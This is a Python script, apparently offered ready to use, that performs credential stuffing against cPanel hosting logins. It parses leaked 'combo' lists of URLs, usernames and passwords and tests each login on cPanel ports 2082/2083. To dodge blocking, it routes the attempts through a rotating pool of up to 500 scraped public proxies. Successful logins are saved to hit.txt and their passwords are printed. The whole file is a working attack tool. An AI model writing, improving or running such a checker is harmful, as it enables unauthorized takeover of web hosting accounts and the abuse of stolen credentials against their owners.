#!/usr/bin/env python3
"""
cPanel Reliable Checker - with Auto Proxy (Limit 500), Thread Optimization & Auto-Repair
- Fetches proxies from ProxyScrape, TheSpys, Geonode (max 500)
- Validates proxies automatically
- Multi-threaded checking with dynamic thread count based on proxy pool
- Dead proxies are removed; when pool low, auto-refill in background (does not stop checker)
- All original credential extraction and testing logic preserved
"""

import requests
import re
import sys
import os
import random
import time
import threading
import queue
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional

requests.packages.urllib3.disable_warnings()

# ---------- Logging (optional, can be disabled) ----------
logging.basicConfig(level=logging.WARNING)  # Reduce noise, set to INFO for details
logger = logging.getLogger(__name__)

# ---------- Proxy Sources (limited to 500 total) ----------
class ProxyManager:
    def __init__(self, max_proxies=500, refill_threshold=20):
        self.max_proxies = max_proxies
        self.refill_threshold = refill_threshold
        self.proxy_queue = queue.Queue()
        self.all_working = []          # list of currently known working proxies
        self.lock = threading.Lock()
        self.refill_lock = threading.Lock()
        self.is_refilling = False
        self.running = True

    def _fetch_from_source(self, url, parser=None):
        """Fetch proxies from a URL, optionally with a JSON parser."""
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code != 200:
                return []
            if parser:
                return parser(resp)
            else:
                return [line.strip() for line in resp.text.splitlines() if line.strip()]
        except Exception as e:
            logger.debug(f"Fetch error from {url}: {e}")
            return []

    def _fetch_all_proxies(self):
        """Gather proxies from multiple sources, then limit to max_proxies."""
        all_proxies = []

        # ProxyScrape HTTP
        all_proxies.extend(self._fetch_from_source(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
        ))
        # ProxyScrape SOCKS4
        all_proxies.extend(self._fetch_from_source(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=5000&country=all&ssl=all&anonymity=all"
        ))
        # ProxyScrape SOCKS5
        all_proxies.extend(self._fetch_from_source(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=all"
        ))
        # TheSpys (HTTP)
        all_proxies.extend(self._fetch_from_source(
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ))
        # Geonode (JSON)
        def geonode_parser(resp):
            data = resp.json()
            proxies = []
            for item in data.get('data', []):
                ip = item.get('ip')
                port = item.get('port')
                protocol = item.get('protocols', ['http'])[0]
                if ip and port:
                    proxies.append(f"{protocol}://{ip}:{port}")
            return proxies
        all_proxies.extend(self._fetch_from_source(
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Csocks4%2Csocks5",
            parser=geonode_parser
        ))

        # Deduplicate and limit
        unique = list(set(all_proxies))
        if len(unique) > self.max_proxies:
            unique = random.sample(unique, self.max_proxies)
        logger.info(f"Fetched {len(unique)} unique proxies (limit {self.max_proxies})")
        return unique

    def _validate_single_proxy(self, proxy, test_url="http://1.1.1.1", timeout=5):
        """Check if proxy works."""
        try:
            proxies = {"http": proxy, "https": proxy}
            resp = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
            return resp.status_code == 200
        except:
            return False

    def _validate_proxies(self, proxy_list, max_workers=50):
        """Concurrently validate proxies; return list of working ones."""
        if not proxy_list:
            return []
        working = []
        total = len(proxy_list)
        completed = 0
        logger.info(f"Validating {total} proxies...")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {executor.submit(self._validate_single_proxy, p): p for p in proxy_list}
            for future in as_completed(future_to_proxy):
                completed += 1
                if completed % 100 == 0:
                    logger.info(f"Validated {completed}/{total}")
                if future.result():
                    working.append(future_to_proxy[future])
        logger.info(f"Found {len(working)} working proxies")
        return working

    def _refill_proxies(self):
        """Background refill: fetch new proxies, validate, replace pool."""
        with self.refill_lock:
            if self.is_refilling:
                return
            self.is_refilling = True
        try:
            logger.info("Proxy pool low – refilling in background...")
            fresh_raw = self._fetch_all_proxies()
            fresh_working = self._validate_proxies(fresh_raw, max_workers=30)
            with self.lock:
                # Clear existing queue
                while not self.proxy_queue.empty():
                    try:
                        self.proxy_queue.get_nowait()
                    except queue.Empty:
                        break
                # Refill queue with new working proxies
                for p in fresh_working:
                    self.proxy_queue.put(p)
                self.all_working = fresh_working.copy()
            logger.info(f"Refill complete: {len(fresh_working)} proxies available")
        except Exception as e:
            logger.error(f"Refill failed: {e}")
        finally:
            self.is_refilling = False

    def initialize(self):
        """Initial setup: fetch and validate proxies."""
        raw = self._fetch_all_proxies()
        working = self._validate_proxies(raw)
        for p in working:
            self.proxy_queue.put(p)
        self.all_working = working
        if len(working) < self.refill_threshold:
            # Start refill in background (non-blocking)
            threading.Thread(target=self._refill_proxies, daemon=True).start()
        return working

    def get_proxy(self):
        """Get a working proxy from the pool. If pool empty, wait briefly for refill."""
        if self.proxy_queue.empty():
            if not self.is_refilling:
                threading.Thread(target=self._refill_proxies, daemon=True).start()
            # Wait up to 5 seconds for a proxy to appear
            for _ in range(10):
                if not self.proxy_queue.empty():
                    break
                time.sleep(0.5)
        try:
            return self.proxy_queue.get_nowait()
        except queue.Empty:
            return None

    def mark_dead(self, proxy):
        """Remove a proxy from the pool (it failed)."""
        with self.lock:
            if proxy in self.all_working:
                self.all_working.remove(proxy)
        # Trigger refill if pool size drops below threshold
        if self.proxy_queue.qsize() < self.refill_threshold and not self.is_refilling:
            threading.Thread(target=self._refill_proxies, daemon=True).start()

    def return_proxy(self, proxy):
        """Return a working proxy to the queue for reuse."""
        if proxy:
            self.proxy_queue.put(proxy)


# ---------- Original credential extraction (unchanged) ----------
def extract_credentials(line):
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None

    # Strategy 1: user:pass@url
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd

    # Strategy 2: url|user|pass
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])

    # Strategy 3: url:user:pass (simple)
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]

    # Strategy 4: URL pattern then tokens
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]

    # Strategy 5: domain then tokens
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def test_login(url, user, pwd, proxy=None, timeout=10):
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.post(login_url, data=payload, timeout=timeout, verify=False, allow_redirects=False, proxies=proxies)
        if resp.status_code == 200 and ('security_token' in resp.text or 'cpsess' in resp.text):
            return True, url
        return False, None
    except:
        return False, None


# ---------- Multi‑threaded checker with auto proxy & repair ----------
class CpanelChecker:
    def __init__(self, combos, proxy_manager, threads=None):
        self.combos = combos
        self.proxy_manager = proxy_manager
        self.threads = threads if threads else self._auto_threads()
        self.hits = []
        self.hit_file = "hit.txt"
        self.lock = threading.Lock()
        self.completed = 0
        self.total = len(combos)

    def _auto_threads(self):
        """Optimize thread count based on proxy pool size (min 5, max 100)."""
        pool_size = self.proxy_manager.proxy_queue.qsize()
        if pool_size == 0:
            return 15
        # Use proxy count * 2, but not exceeding 100
        threads = min(max(pool_size * 2, 5), 100)
        print(f"[Auto] Proxy pool size: {pool_size} → using {threads} threads")
        return threads

    def check_one(self, combo):
        url, user, pwd = combo
        proxy = self.proxy_manager.get_proxy()
        success, norm_url = test_login(url, user, pwd, proxy=proxy)
        if not success and proxy:
            # Proxy likely dead; remove it
            self.proxy_manager.mark_dead(proxy)
        elif success and proxy:
            # Proxy worked – return it to pool
            self.proxy_manager.return_proxy(proxy)
        return success, norm_url, user, pwd, url

    def run(self):
        print(f"\nStarting checker with {self.total} combos, {self.threads} threads...\n")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_combo = {executor.submit(self.check_one, combo): combo for combo in self.combos}
            for future in as_completed(future_to_combo):
                self.completed += 1
                combo = future_to_combo[future]
                try:
                    success, norm_url, user, pwd, orig_url = future.result()
                    if success:
                        with self.lock:
                            self.hits.append((norm_url, user, pwd))
                            self._save_hit(norm_url, user, pwd)
                        print(f"\n✓ HIT: {user}@{norm_url}")
                        print(f"   Password: {pwd}\n")
                    else:
                        # Optional: show failures occasionally
                        if self.completed % 50 == 0:
                            print(f"Progress: {self.completed}/{self.total} (fail example: {user}@{orig_url})")
                except Exception as e:
                    logger.error(f"Error checking {combo}: {e}")
        self._summary()

    def _save_hit(self, url, user, pwd):
        with open(self.hit_file, 'a', encoding='utf-8') as f:
            f.write(f"{user}:{pwd}@{url}\n")

    def _summary(self):
        print("\n" + "="*60)
        print(f"Check completed. Total hits: {len(self.hits)}")
        print(f"Hits saved to {self.hit_file}")
        if self.hits:
            print("\n--- HIT LIST ---")
            for url, user, pwd in self.hits:
                print(f"{user}:{pwd}@{url}")
        print("="*60)


# ---------- Main (preserves original interface) ----------
def main():
    print("=" * 70)
    print("cPanel Reliable Checker - Auto Proxy (Limit 500) & Auto-Repair")
    print("=" * 70)

    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        filename = ("combo.txt")

    if not os.path.exists(filename):
        print(f"File not found: {filename}")
        return

    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    combos = []
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)

    if not combos:
        print("No valid combos could be extracted. Check file format.")
        return

    print(f"\nExtracted {len(combos)} potential combos.")

    # Initialize proxy manager (max 500, auto-refill threshold 20)
    proxy_mgr = ProxyManager(max_proxies=500, refill_threshold=20)
    print("Fetching and validating proxies (limit 500)... Please wait.")
    working = proxy_mgr.initialize()
    if not working:
        print("WARNING: No working proxies found. Continuing without proxy (may be slow).")
    else:
        print(f"Loaded {len(working)} working proxies. Auto-repair active (threshold={proxy_mgr.refill_threshold}).")

    # Thread optimization (user can override)
    default_threads = proxy_mgr.proxy_queue.qsize() * 2 if proxy_mgr.proxy_queue.qsize() > 0 else 15
    default_threads = min(max(default_threads, 5), 100)
    try:
        thr_input = input(f"Enter number of threads (press Enter for auto = {default_threads}): ").strip()
        if thr_input:
            threads = int(thr_input)
        else:
            threads = default_threads
    except:
        threads = default_threads

    # Run checker
    checker = CpanelChecker(combos, proxy_mgr, threads=threads)
    checker.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        print(f"\n[!] Error: {e}")